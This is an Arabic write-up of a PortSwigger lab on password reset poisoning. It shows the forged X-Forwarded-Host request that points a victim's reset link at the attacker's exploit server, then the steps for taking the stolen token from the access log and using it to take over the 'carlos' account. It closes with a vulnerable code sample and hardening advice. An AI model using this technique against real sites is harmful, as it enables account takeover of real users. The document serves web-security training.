# Lab : Password reset poisoning via middleware

https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware

- الفكره من الLab ده ان خانه الrest password بتبعت علي الemail link و الضحيه بيضغط علي اي link وخلاص فا انا ممكن احوله علي صفحه الexploitaion بتاعتي وتظهر الtoken reset password عنطريق X-Forwarded-Host:

```bash
1. X-Forwarded-Host: https://exploit-0aba00e5045f847f830b7e25017600ee.exploit-server.net/ر
```

اللاب ده من فئة **Password Reset Poisoning**، وهي ثغرة بتحصل لما التطبيق بيبني **رابط إعادة تعيين الباسورد (password reset link)** ديناميكيًا بناءً على **هيدر بيتحكم فيه العميل** (زي `Host` أو `X-Forwarded-Host`)، بدل ما يستخدم domain ثابت ومحدد مسبقًا من إعدادات السيرفر نفسه.

### طبيعة الثغرة

لما تطلب "نسيت الباسورد" (Forgot password)، السيرفر:

1. بيولّد **token عشوائي فريد** (زي `7Rny5ZrVvD0xySSrE3jhexl75U7gdA83`).
2. بيبعت إيميل فيه رابط شكله:

```
   https://<host>/forgot-password?temp-forgot-password-token=<token>
```

حيث `<host>` بيتحدد **ديناميكيًا** من قيمة معينة في الريكوست، بدل ما يكون ثابت (hardcoded) في إعدادات السيرفر.

المشكلة: السيرفر (أو الـ **middleware** اللي قدامه، زي load balancer أو reverse proxy) بيثق في هيدر **`X-Forwarded-Host`** لتحديد الـ domain اللي هيتحط في الرابط، وده هيدر **بيتحكم فيه العميل بالكامل**، فتقدر تخليه يشاور على أي domain تحبه — بما فيه سيرفرك الخاص (Exploit server).

### خطوات الحل بالتفصيل

#### 1. افهم آلية Password Reset

جرب "Forgot password" بحسابك (`wiener`)، وافحص الريكوست:

```
POST /forgot-password HTTP/1.1

username=wiener
```

وشوف الإيميل اللي بيوصلك، فيه رابط فيه الـ token.

#### 2. اكتشف الـ Header الضعيف

ابعت الريكوست `POST /forgot-password` على **Burp Repeater**، وجرب تضيف هيدر:

```
X-Forwarded-Host: anything.com
```

وشوف هل التطبيق بيستخدمه في بناء الرابط الديناميكي (ممكن تلاحظ ده من سلوك الريسبونس أو تجرب وتشوف الإيميل الجديد).

#### 3. جهّز الـ Exploit Server

روح لـ **Go to exploit server**، وسجّل الـ URL بتاعك (شكله: `YOUR-EXPLOIT-SERVER-ID.exploit-server.net`).

#### 4. ابعت الريكوست بالهيدر المسموم + استهداف carlos

في الريكوست في Repeater، ضيف الهيدر وغيّر الـ username:

```
POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

username=carlos
```

ابعت الريكوست. ده هيخلي السيرفر **يبعت إيميل لـ carlos** فيه رابط reset، لكن الـ domain في الرابط هيكون **سيرفرك انت** بدل الموقع الأصلي:

```
https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/forgot-password?temp-forgot-password-token=<carlos-token>
```

#### 5. استنى الضحية يفتح الرابط

اللاب بيقول إن `carlos` بيدوس على أي لينك يوصله في الإيميل من غير تفكير (زي bot تلقائي في السيناريو ده). لما يدوس على الرابط، متصفحه هيروح لسيرفرك انت، وده هيسجل الطلب في الـ **Access log** بتاع الـ Exploit server.

#### 6. اسحب الـ Token المسروق

روح لـ **exploit server > Access log**، هتلاقي:

```
GET /forgot-password?temp-forgot-password-token=<TOKEN> HTTP/1.1
```

انسخ قيمة الـ `temp-forgot-password-token` دي — ده الـ **token الصحيح والفعّال بتاع carlos**.

#### 7. استخدم الـ Token على الموقع الحقيقي

روح لإيميلك انت (بتاع `wiener`)، وانسخ **رابط الـ reset الصحيح** (اللي بيشاور على الموقع الأصلي، مش سيرفرك)، شكله:

```
https://vulnerable-website.com/forgot-password?temp-forgot-password-token=<your-own-token>
```

افتحه في المتصفح، وقبل ما تدوس Submit، **غيّر قيمة الـ `temp-forgot-password-token`** في الـ URL بالقيمة اللي سرقتها بتاعة `carlos` بدل التوكن بتاعك انت.

#### 8. حط باسورد جديد

كمّل الفورم وحط باسورد جديد — بما إن التوكن ده بيخص `carlos`، الباسورد الجديد هيتطبق على **حسابه هو**.

#### 9. سجل دخول بحساب carlos

```
username: carlos
password: <الباسورد الجديد اللي حطيته>
```

اللاب هيتحل تلقائيًا ✅.

### ليه ده بيحصل تقنيًا

الكود بيكون شبه كده:

python

```python
@app.route("/forgot-password", methods=["POST"])def forgot_password():    username = request.form.get("username")    token = generate_random_token()    save_token(username, token)    host = request.headers.get("X-Forwarded-Host", request.host)  # ❌ بيثق في هيدر العميل    reset_link = f"https://{host}/forgot-password?temp-forgot-password-token={token}"    send_email(username, reset_link)
```

المشكلة: التوكن نفسه **قوي وعشوائي وآمن** (مش قابل للتخمين)، لكن المشكلة الحقيقية في **مكان إرساله**. بما إن الرابط بيتبنى باستخدام domain من هيدر يتحكم فيه المهاجم، المهاجم بيقدر "يوجّه" الرابط الحقيقي (بتوكن حقيقي وصالح) لسيرفره هو، فيسرق التوكن وقت ما الضحية تدوس عليه، من غير ما يحتاج يخمن أو يكسر أي حاجة.

هيدر `X-Forwarded-Host` أصلاً معناه: بيُستخدم عادة لما يكون فيه **reverse proxy** قدام السيرفر، والسيرفر محتاج يعرف الـ "Host" الأصلي اللي المستخدم طلبه (لأن الـ proxy بيغيّر الـ `Host` header الحقيقي). لكن لو السيرفر **وثق في الهيدر ده بدون تحقق (بدون whitelist)**، أي حد يقدر يحط فيه أي قيمة يحبها.

### الدرس المستفاد

- **أبدًا متبنيش روابط حساسة (زي password reset links) باستخدام هيدرز بيتحكم فيها العميل** (`Host`, `X-Forwarded-Host`, `X-Original-URL`, إلخ) من غير **whitelist صارم** لقيم الـ domains المسموح بيها.
- التوكن العشوائي القوي **مش كافي لوحده كحماية** لو القناة اللي بيتوصل بيها للمستخدم (الرابط) ممكن تتلاعب فيها.
- الحل الصحيح: استخدام **domain ثابت (hardcoded)** معروف مسبقًا في إعدادات السيرفر لبناء أي رابط بيتبعت بالإيميل، **بدون** الاعتماد على أي هيدر HTTP قابل للتزوير.
- لو محتاج استخدام `X-Forwarded-Host` لأسباب تقنية حقيقية (زي بنية الـ proxy)، لازم يكون فيه **تحقق (validation) صارم** إن القيمة دي بتطابق قائمة domains معروفة ومسموح بيها فقط.
- ده مثال ممتاز على إزاي ثغرة "بسيطة الشكل" (مجرد هيدر إضافي) ممكن تتحول لـ **Account Takeover كامل** لأي مستخدم في النظام.
